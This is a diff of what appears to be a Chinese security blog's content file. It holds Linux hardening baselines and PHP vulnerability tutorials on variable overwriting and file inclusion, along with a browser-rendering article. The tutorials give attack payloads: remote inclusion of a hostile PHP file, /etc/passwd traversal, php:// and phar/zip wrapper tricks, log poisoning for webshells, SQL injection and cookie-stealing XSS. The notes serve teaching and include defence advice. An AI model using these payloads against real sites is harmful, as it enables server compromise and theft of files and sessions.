-<h1 id="九、统一远程日志服务器配置"><a href="#九、统一远程日志服务器配置" class="headerlink" title="九、统一远程日志服务器配置"></a>九、统一远程日志服务器配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：统一远程日志服务器配置</span><br><span class="line">配置要求：当前系统应配置远程日志功能，将需要重点关注的日志内容传输到日志服务器进行备份。</span><br><span class="line">操作指南：# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">检查方法：配置了远程日志服务器为符合</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">          修改配置文件vi /etc/syslog.conf，</span><br><span class="line">          加上这一行：</span><br><span class="line">          *.* @192.168.0.1</span><br><span class="line">          可以将&quot;*.*&quot;替换为你实际需要的日志信息。比如：kern.* / mail.* 等等；可以将此处192.168.0.1替换为实际的IP或域名。</span><br><span class="line">          重新启动syslog服务，执行下列命令：</span><br><span class="line">          services syslogd restart</span><br><span class="line">          2、补充操作说明</span><br><span class="line">          注意：*.*和@之间为一个Tab</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十、设置history时间戳"><a href="#十、设置history时间戳" class="headerlink" title="十、设置history时间戳"></a>十、设置history时间戳</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：设置history时间戳</span><br><span class="line">配置要求：配置history时间戳，便于审计。</span><br><span class="line">操作指南：# cat /etc/bashrc查看是否有对应配置</span><br><span class="line">检查方法：已添加，如：“export HISTTIMEFORMAT=&quot;%F %T”配置为符合。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          在/etc/bashrc文件中增加如下行：</span><br><span class="line">          export HISTTIMEFORMAT=&quot;%F %T</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十一、ssh登录配置"><a href="#十一、ssh登录配置" class="headerlink" title="十一、ssh登录配置"></a>十一、ssh登录配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：SSH登录配置</span><br><span class="line">配置要求：系统应配置使用SSH等加密协议进行远程登录维护，并安全配置SSHD的设置。不使用TELENT进行远程登录维护。</span><br><span class="line">操作指南：1、查看SSH服务状态：# ps –elf|grep ssh；</span><br><span class="line">          2、查看telnet服务状态：# ps –elf|grep telnet。</span><br><span class="line">检查方法：1、	不能使用telnet进行远程维护；</span><br><span class="line">          2、	应使用SSH进行远程维护；</span><br><span class="line">          3、	SSH配置要符合如下要求；</span><br><span class="line">              Protocol  2 #使用ssh2版本</span><br><span class="line">              X11Forwarding yes #允许窗口图形传输使用ssh加密</span><br><span class="line">              IgnoreRhosts  yes#完全禁止SSHD使用.rhosts文件</span><br><span class="line">              RhostsAuthentication no #不设置使用基于rhosts的安全验证</span><br><span class="line">              RhostsRSAAuthentication no #不设置使用RSA算法的基于rhosts的安全验证</span><br><span class="line">              HostbasedAuthentication no #不允许基于主机白名单方式认证</span><br><span class="line">              PermitRootLogin no #不允许root登录</span><br><span class="line">              PermitEmptyPasswords no #不允许空密码</span><br><span class="line">              Banner /etc/motd  #设置ssh登录时显示的banner</span><br><span class="line">          4、以上条件都满足为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            编辑 sshd_config，添加相关设置，SSHD相关安全设置选项参考检查方法中的描述。</span><br><span class="line">          2、补充操作说明</span><br><span class="line">            查看SSH服务状态：# ps –elf|grep ssh</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十二、关闭不必要的服务"><a href="#十二、关闭不必要的服务" class="headerlink" title="十二、关闭不必要的服务"></a>十二、关闭不必要的服务</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关闭不必要的系统服务</span><br><span class="line">配置要求：根据每台机器的不同角色，关闭不需要的系统服务。操作指南中的服务项提供参考，根据服务器的角色和应用情况对启动项进行修改。</span><br><span class="line">如无特殊需要，应关闭Sendmail、Telnet、Bind等服务。</span><br><span class="line">操作指南：执行命令 #chkconfig --list，查看哪些服务开放。</span><br><span class="line">检查方法：与管理员确认无用服务已关闭</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">        使用如下方式禁用不必要的服务</span><br><span class="line">        #service &lt;服务名&gt; stop</span><br><span class="line">        #chkconfig --level 35 off</span><br><span class="line">        2、参考说明</span><br><span class="line">        Linux/Unix系统服务中，部分服务存在较高安全风险，应当禁用，包括：</span><br><span class="line">        “lpd”，此服务为行式打印机后台程序，用于假脱机打印工作的UNIX后台程序，此服务通常情况下不用，建议禁用；</span><br><span class="line">        “telnet”，此服务采用明文传输数据，登陆信息容易被窃取，建议用ssh代替；</span><br><span class="line">        “routed”，此服务为路由守候进程，使用动态RIP路由选择协议，建议禁用；</span><br><span class="line">        “sendmail”，此服务为邮件服务守护进程，非邮件服务器应将其关闭；</span><br><span class="line">        “Bluetooth”，此服务为蓝牙服务，如果不需要蓝牙服务时应关闭；</span><br><span class="line">        “identd”，此服务为AUTH服务，在提供用户信息方面与finger类似，一般情况下该服务不是必须的，建议关闭；</span><br><span class="line">        “xfs”，此服务为Linux中X Window的字体服务，关于该服务历史上出现过信息泄露和拒绝服务等漏洞，应以减少系统风险；</span><br><span class="line">        R服务（“rlogin”、“rwho”、“rsh”、“rexec”），R服务设计上存在严重的安全缺陷，仅适用于封闭环境中信任主机之间便捷访问，</span><br><span class="line">        其他场合下均必须禁用；</span><br><span class="line">        基于inetd/xinetd的服务（daytime、chargen、echo等），此类服务建议禁用。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十三、禁止ctr-alt-del键盘关闭命令"><a href="#十三、禁止ctr-alt-del键盘关闭命令" class="headerlink" title="十三、禁止ctr+alt+del键盘关闭命令"></a>十三、禁止ctr+alt+del键盘关闭命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：禁止Control-Alt-Delete键盘关闭命令</span><br><span class="line">配置要求：应禁止使用Control-Alt-Delete组合键重启服务器，防止误操作</span><br><span class="line">操作指南：命令cat /etc/inittab，查看配置</span><br><span class="line">检查方法：/etc/inittab 中应有：“#ca::ctrlaltdel:/sbin/shutdown -t3 -r now”配置为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            在“/etc/inittab” 文件中注释掉下面这行（使用#）： ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            改为： #ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            为了使此改动生效，输入下面这个命令： # /sbin/init q</span><br><span class="line">        2、补充说明</span><br><span class="line">            禁止ctl-alt-del使得在控制台直接按ctl-alt-del不能重新启动计算机。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十四、安装操作系统补丁"><a href="#十四、安装操作系统补丁" class="headerlink" title="十四、安装操作系统补丁"></a>十四、安装操作系统补丁</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安装操作系统更新补丁</span><br><span class="line">配置要求：安装操作系统更新补丁，修复系统漏洞</span><br><span class="line">操作指南：1、查看当前系统补丁版本</span><br><span class="line">          2、检查官网当前系统版本是否发布安全更新。</span><br><span class="line">检查方法：版本应保持为最新</span><br><span class="line">配置方法：通过访问</span><br><span class="line">https://rhn.redhat.com/errata/下载补丁安装包，在打开的页面上，选择与自己使用相对应的系统后，点击连接进入补丁包下载列表界面，</span><br><span class="line">选择需要的补丁下载。</span><br><span class="line">         下载的补丁为rpm安装包，将该安装包复制到目标系统上，使用命令rpm –ivh xxx.rpm进行安装，随后重新启动系统，</span><br><span class="line">         检查所安装补丁的服务或应用程序是否运行正常，即完成该补丁的安装和升级工作。</span><br><span class="line">适用版本：Linux Redhat AS 3 Linux Redhat AS 4</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>安全基线</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>变量覆盖</title>
-    <url>/2025/04/10/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
-    <content><![CDATA[<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>使用自定义的参数值去覆盖替换程序原有的变量值。</p>
-<p>涉及函数：extract parse_str import_request_variables——php5.4版本以上已被弃用 $$</p>
-<p><strong>extract函数</strong></p>
-<p>该函数将一个数组注册成变量，每一对键值对对应一组变量。</p>
-<p><code>int extract (array,options,prefix)</code></p>
-<p>第一个参数为一个数组，为被操作量，第二个参数限定了变量注册的规则。当第二个参数为</p>
-<p><a href="%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%2075f71fb7b52d48ac8f1fee5971481ad6/%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%20f6faafce79bd4e4483c243fcc670bbeb.csv">第二个参数</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpecho &quot;&lt;meta http-equiv=&#x27;content-type&#x27; content=&#x27;text/html;charset=utf-8&#x27;&gt;&quot;;//extract$a=10;echo &#x27;覆盖前$a：&#x27;.$a.&#x27;&lt;/br&gt;&#x27;;$o=array(&#x27;a&#x27;=&gt;20,&#x27;b&#x27;=&gt;30);extract($o);echo &#x27;覆盖后$a：&#x27;.$a.&#x27;&lt;/br&gt;&#x27;;echo &#x27;新注册变量$b：&#x27;.$b.&#x27;&lt;/br&gt;&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><strong>parse_str函数</strong></p>
-<p>解析字符串注册变量，在注册变量之前不会验证它是否已经存在，所以会直接覆盖到之前的变量。</p>
-<p><code>void parse_str(string,array)</code></p>
-<p>第一个参数是要注册的字符串，形式为<code>a=1</code> 会被注册为<code>$a=1</code> ,当第二个参数存在的时候，该变量会被注册为一个数组。如果这个数组原本就存在相同的键，则会覆盖掉原有的键</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//parse_str//注册变量$d=111;echo &#x27;parse_str覆盖前$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;parse_str(&#x27;d=666&#x27;);echo &#x27;parse_str覆盖后$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;//注册数组parse_str(&#x27;d=8888&#x27;,$g);echo &#x27;parse_str注册数组覆盖后$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;var_dump(&#x27;parse_str覆盖后$g：&#x27;.$g.&#x27;&lt;/br&gt;&#x27;);echo $g[&#x27;d&#x27;];</span><br></pre></td></tr></table></figure>
-
-<p><strong>import_request_variables函数</strong></p>
-<p>报get、post、cookie中的参数注册为变量，用在在register_globals被禁止的时候，因为存在安全风险，现在已经不建议使用。</p>
-<p><code>bool import_request_variables(types,prefix)</code></p>
-<p>types GPC</p>
-<p>prefix 前缀</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$h=11;//import_request_variables(&#x27;GP&#x27;); //已启用echo $h;</span><br></pre></td></tr></table></figure>
-
-<p><strong>$$变量覆盖</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php$a=10;echo $a;echo &#x27;&lt;/br&gt;&#x27;;foreach ($_POST as $key=&gt;$value)&#123;    $$key=$value;    echo $a;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过变量覆盖，我们可以直接覆盖所有之前的变量，比如说存在一天sql语句这么写的</p>
-<p><code>select * from &#123;$test&#125; where name=&#39;armandhe&#39;</code></p>
-<p>那么可以覆盖$test，传入</p>
-<p><code>?test=mysql.user limit 1%23</code></p>
-<p>这样就形成了sql注入</p>
-<p>也可以直接注入xss</p>
-<p>如果后台存在</p>
-<p><code>echo $a</code></p>
-<p>覆盖</p>
-<p><code>?a=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><blockquote>
-<p>使用原始变量，$_GET等，不要玩花的。</p>
-</blockquote>
-<blockquote>
-<p>注册变量前，先验证变量是否存在。</p>
-</blockquote>
-<blockquote>
-<p>同一加前缀</p>
-</blockquote>
-<blockquote>
-<p>自行定义的变量一定要记住初始化， 不然即便注册变量的代码在最前面也会覆盖这些未初始化的变量。</p>
-</blockquote>
-<p>关闭 register_globals</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>漏洞原理</tag>
-        <tag>变量覆盖</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>应急响应</title>
     <url>/2025/04/10/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
     <content><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h2><h3 id="系统账户相关"><a href="#系统账户相关" class="headerlink" title="系统账户相关"></a>系统账户相关</h3><ul>
@@ -3142,142 +3095,9 @@
         <category>漏洞原理</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>漏洞原理</tag>
+        <tag>PHP</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/2025/04/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>服务端提供了从另一个页面加载另一个页面的功能，且该功能的接口是用户可控的，由于程序未对用户的输入做严格的过滤，或者过滤不够严谨，就可能导致文件包含的漏洞。文件包含的函数又include\include_once_once，include在包含一个文件时如果出错只会抛出警告，程序还是会继续执行，require则会直接结束，还有可能是file_get_contengs。这写函数将直接读取文件内容，并将文件内容原样输出到要包含文件的文件中，因为该文件拥有合乎规则的执行权限，所以，被包含文件中的恶意代码将被执行。我们利用文件包含漏洞上传的图片马往往就利用文件包含的这个特性得以执行。</p>
-<p><code>需要开启allow_url_include 和 allow_url_fopen</code> 允许文件包含和允许读取文件</p>
-<h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>可以使用http协议从远程包含我们的恶意代码到目标文件</p>
-<p><code>?file=http://www.baidu.com/hack.php</code> 任意文件后缀都可以</p>
-<h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><p>配合目录穿越漏洞，获取服务器本地文件系统的敏感文件、执行php代码</p>
-<p><strong>目录穿越：</strong> ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
-<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>利用php默认的session存储路径及来实现恶意代码执行</p>
-<p>linux session文件在目录<code>/var/lib/php/session</code>中，可以通过phpinfo搜索<code>session_save_path</code>查看，session文件的命名规则是<code>sess_phpsessionid</code> session我们可以通过抓包获取。如果用户上传的参数被写入到session中，我们就可以利用文件包含漏洞执行恶意代码，前提是当前php中间件具有对session文件及其父目录的读权限。</p>
-<h3 id="sshlog文件包含"><a href="#sshlog文件包含" class="headerlink" title="sshlog文件包含"></a>sshlog文件包含</h3><p>利用ssh的日志信息，通过ssh登录时将恶意代码写入到用户名部分，再利用远程文件包含漏洞执行该文件。</p>
-<p>ssh默认日志路径：<code>/var/log/auth.log</code></p>
-<p>ssh登录姿势：ssh @192.168.0.102</p>
-<p>日志文件中记录</p>
-<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled.png" referrerpolicy="no-referrer"></p>
-<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled.png</p>
-<h3 id="apache2访问日志，错误日志"><a href="#apache2访问日志，错误日志" class="headerlink" title="apache2访问日志，错误日志"></a>apache2访问日志，错误日志</h3><p>日志文件路径：<code>/var/log/apache2/access.log|error.log</code></p>
-<p>利用方式：直接访问不存在的路径：<code>http://www.armandhe.com/&lt;?php phpinfo();?&gt;</code> 因为url中的数据会被编码，所以在访问的时候需要抓包后，修改上传参数为为编码的格式。</p>
-<p><strong>那么mysql的访问日志是不是也可以做同样的操作</strong></p>
-<p><strong>上述访问日志的方式有一个前提条件就是php要有读这些目录以及文件的权限</strong></p>
-<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h3 id="本地文件包含有限制的染过"><a href="#本地文件包含有限制的染过" class="headerlink" title="本地文件包含有限制的染过"></a>本地文件包含有限制的染过</h3><p>%00截断</p>
-<p>路劲长度截断</p>
-<p><strong>一个特性：linux中目录最长不超过4096字节，超出的部分将被丢弃，windows中目录最长不超过256字节，超过的将被丢弃</strong></p>
-<p>通过…………………………………………或者..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;截断</p>
-<h3 id="远程文件包含绕过"><a href="#远程文件包含绕过" class="headerlink" title="远程文件包含绕过"></a>远程文件包含绕过</h3><p>？# space空格</p>
-<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><strong>php:&#x2F;&#x2F;filter ———-读取本地文件 只需开启allow_url_fopen</strong></p>
-<p><code>?file=php://filter/convert.base64-encode/resource=file://c:/windows/win.ini</code></p>
-<p>有些文件中包含一些特殊字符，直接用file协议可能无法读取成功，所以先进行base编码之后再来传输。</p>
-<p><strong>php:&#x2F;&#x2F;input—————读取post数据 需同时开启两个配置项</strong></p>
-<p>当代码中处理用户上传数据使用的是file_get_contents的时候就可以使用该协议</p>
-<p>该函数获取原始post请求的方式是<code>file_get_contents(&quot;php://input&quot;)</code></p>
-<p>那么我们就可以将<code>php://input</code> 作为参数传上去，而具体的post内容通过抓包更改请求头类型，添加请求体来实现。</p>
-<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%201.png" referrerpolicy="no-referrer"></p>
-<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%201.png</p>
-<p>可以直接在当前目录中写入木马，然后用蚁剑链接</p>
-<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%202.png" referrerpolicy="no-referrer"></p>
-<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%202.png</p>
-<p>或者直接执行操作系统命令</p>
-<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%203.png" referrerpolicy="no-referrer"></p>
-<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%203.png</p>
-<p><strong>file:&#x2F;&#x2F; —————读取本地文件</strong></p>
-<p><code>?file=file:///etc/passwd</code></p>
-<p><strong>data:&#x2F;&#x2F;————读取本地文件 配合file_get_contents使用</strong></p>
-<p><code>?file=data://text/plain;base64,cGhwaW5mbygpOw==</code></p>
-<p><strong>phar:&#x2F;&#x2F;————解压缩 有效</strong></p>
-<p><code>?file=phar://hack.png/hack.php</code> hack实际上是一个压缩文件，只不过后缀名在压缩完成后被手动修改伪png来绕过过滤策略，且压缩的格式必须为zip。可以配合文件上传漏洞使用</p>
-<p><strong>zip:&#x2F;&#x2F;————-解压缩 有效</strong></p>
-<p><code>?file=zip://hack.png#hack.php</code> hack文件是在hack.zip中真实存在的，hack是压缩文件压缩后修改的后缀名为png。功能和phar一样</p>
-<p><strong>测试代码</strong>fang</p>
-<p><a href="hack.zip">hack.zip</a></p>
-<p><a href="pharTest.php">pharTest.php</a></p>
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>关闭allow_url_include</p>
-<p>将open_basedir 设置为指定目录，即只允许该目录文件被访问。</p>
-<p>设置白名单</p>
-<p>设置黑名单，过滤危险协议关键字，</p>
-<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol>
-<li>敏感文件泄露</li>
-<li>被getshell</li>
-<li>任意命令执行</li>
-</ol>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>漏洞原理</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>浏览器渲染原理</title>
-    <url>/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/</url>
-    <content><![CDATA[<h1 id="浏览器渲染原理"><a href="#浏览器渲染原理" class="headerlink" title="浏览器渲染原理"></a>浏览器渲染原理</h1><p>用户看到页面可以分为两个阶段，页面内容加载完毕与页面资源加载完成，分别对应DOMcontentloaded 和load事件</p>
-<p>DOMcontentloaded事件触发时，仅到DOM加载完毕</p>
-<p>load事件触发时，页面上所有的dom,css,js 等其他资源全部加载完毕</p>
-<h1 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h1><ol>
-<li>浏览器解析html文档为dom树</li>
-<li>浏览器解析css文档为cssom树，css对象模型</li>
-<li>合并dom与cssom为渲染树</li>
-<li>布局</li>
-<li>将渲染树各个节点绘制到屏幕上面，这一步为绘制</li>
-</ol>
-<p><img src="/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/Untitled.png" referrerpolicy="no-referrer"></p>
-<p>上述过程并不是顺序执行的，根据实际情况可能会并行、重复执行</p>
-<h2 id="DOM树构建过程"><a href="#DOM树构建过程" class="headerlink" title="DOM树构建过程"></a>DOM树构建过程</h2><ul>
-<li>DOM树在构建的过程中可能会被CSS和JS的加载而执行阻塞</li>
-<li><code>display:none</code>的元素也会在DOM树中</li>
-<li>注释也会在DOM树中</li>
-<li><code>script</code>标签会在DOM树中</li>
-</ul>
-<p>无论是DOM还是CSSOM，都是要经过Bytes→characters→tokens→nodes→object model这个过程。</p>
-<p><img src="/Untitled%201.png" referrerpolicy="no-referrer"></p>
-<p>当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。</p>
-<h2 id="构建CSS规则树"><a href="#构建CSS规则树" class="headerlink" title="构建CSS规则树"></a>构建CSS规则树</h2><p>浏览器解析CSS文件并生成CSSOM，每个CSS文件都被分析成一个StyleSheet对象，每个对象都包含CSS规则。CSS规则对象包含对应于CSS语法的选择器和声明对象以及其他对象。<br>在这个过程需要注意的是：</p>
-<ul>
-<li>CSS解析可以与DOM解析同时进行。</li>
-<li>CSS解析与<code>script</code>的执行互斥 。</li>
-<li>在Webkit内核中进行了<code>script</code>执行优化，只有在JS访问CSS时才会发生互斥。</li>
-</ul>
-<h2 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h2><p>通过DOM树和CSS规则树，浏览器就可以通过它两构建渲染树了。浏览器会先从DOM树的根节点开始遍历每个可见节点，然后对每个可见节点找到适配的CSS样式规则并应用。<br>有以下几点需要注意：</p>
-<ul>
-<li>Render Tree和DOM Tree不完全对应</li>
-<li><code>display: none</code>的元素不在Render Tree中</li>
-<li><code>visibility: hidden</code>的元素在Render Tree中</li>
-</ul>
-<p><img src="/Untitled%202.png" referrerpolicy="no-referrer"></p>
-<p>渲染树生成后，还是没有办法渲染到屏幕上，渲染到屏幕需要得到各个节点的位置信息，这就需要布局（Layout）的处理了。</p>
-<h2 id="渲染树布局"><a href="#渲染树布局" class="headerlink" title="渲染树布局"></a>渲染树布局</h2><p>布局阶段会从渲染树的根节点开始遍历，由于渲染树的每个节点都是一个Render Object对象，包含宽高，位置，背景色等样式信息。所以浏览器就可以通过这些样式信息来确定每个节点对象在页面上的确切大小和位置，布局阶段的输出就是我们常说的盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。需要注意的是：</p>
-<ul>
-<li><code>float</code>元素，<code>absoulte</code>元素，<code>fixed</code>元素会发生位置偏移。</li>
-<li>我们常说的脱离文档流，其实就是脱离Render Tree。</li>
-</ul>
-<h2 id="渲染树绘制"><a href="#渲染树绘制" class="headerlink" title="渲染树绘制"></a>渲染树绘制</h2><p>在绘制阶段，浏览器会遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。</p>
-<h1 id="浏览器核心部件"><a href="#浏览器核心部件" class="headerlink" title="浏览器核心部件"></a>浏览器核心部件</h1><p><img src="/Untitled%203.png" referrerpolicy="no-referrer"></p>
-<p>主流的渲染引擎有webkit&#x2F;Gecko</p>
-<h1 id="渲染机制的补充"><a href="#渲染机制的补充" class="headerlink" title="渲染机制的补充"></a>渲染机制的补充</h1><h2 id="渲染阻塞"><a href="#渲染阻塞" class="headerlink" title="渲染阻塞"></a>渲染阻塞</h2><h3 id="js渲染阻塞"><a href="#js渲染阻塞" class="headerlink" title="js渲染阻塞"></a>js渲染阻塞</h3><p>JS可以操作DOM来修改DOM结构，可以操作CSSOM来修改节点样式，这就导致了浏览器在遇到<code>&lt;script&gt;</code>标签时，DOM构建将暂停，直至脚本完成执行，然后继续构建DOM。如果脚本是外部的，会等待脚本下载完毕，再继续解析文档。现在可以在<code>script</code>标签上增加属性<code>defer</code>或者<code>async</code>。脚本解析会将脚本中改变DOM和CSS的地方分别解析出来，追加到DOM树和CSSOM规则树上。</p>
-<h3 id="css渲染阻塞"><a href="#css渲染阻塞" class="headerlink" title="css渲染阻塞"></a>css渲染阻塞</h3><p>由于CSSOM负责存储渲染信息，浏览器就必须保证在合成渲染树之前，CSSOM是完备的，这种完备是指所有的CSS（内联、内部和外部）都已经下载完，并解析完，只有CSSOM和DOM的解析完全结束，浏览器才会进入下一步的渲染，这就是CSS阻塞渲染。</p>
-<p>CSS阻塞渲染意味着，在CSSOM完备前，页面将一直处理白屏状态，这就是为什么样式放在<code>head</code>中，仅仅是为了更快的解析CSS，保证更快的首次渲染。</p>
-<h2 id="回流"><a href="#回流" class="headerlink" title="回流"></a>回流</h2><p>当页面的布局发生改变的时候，必然会触发回流，触发回流必然会触发重绘</p>
-<h2 id="重绘"><a href="#重绘" class="headerlink" title="重绘"></a>重绘</h2><p>当元素的背景颜色，背景色、边框颜色等发生变化的时候，会触发重绘</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>浏览器</category>
-      </categories>
-      <tags>
-        <tag>浏览器</tag>
-        <tag>渲染</tag>
       </tags>
   </entry>
   <entry>
@@ -3356,6 +3176,207 @@
       </tags>
   </entry>
   <entry>
+    <title>文件包含漏洞</title>
+    <url>/2025/04/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>服务端提供了从另一个页面加载另一个页面的功能，且该功能的接口是用户可控的，由于程序未对用户的输入做严格的过滤，或者过滤不够严谨，就可能导致文件包含的漏洞。文件包含的函数又include\include_once_once，include在包含一个文件时如果出错只会抛出警告，程序还是会继续执行，require则会直接结束，还有可能是file_get_contengs。这写函数将直接读取文件内容，并将文件内容原样输出到要包含文件的文件中，因为该文件拥有合乎规则的执行权限，所以，被包含文件中的恶意代码将被执行。我们利用文件包含漏洞上传的图片马往往就利用文件包含的这个特性得以执行。</p>
+<p><code>需要开启allow_url_include 和 allow_url_fopen</code> 允许文件包含和允许读取文件</p>
+<h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>可以使用http协议从远程包含我们的恶意代码到目标文件</p>
+<p><code>?file=http://www.baidu.com/hack.php</code> 任意文件后缀都可以</p>
+<h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><p>配合目录穿越漏洞，获取服务器本地文件系统的敏感文件、执行php代码</p>
+<p><strong>目录穿越：</strong> ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
+<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>利用php默认的session存储路径及来实现恶意代码执行</p>
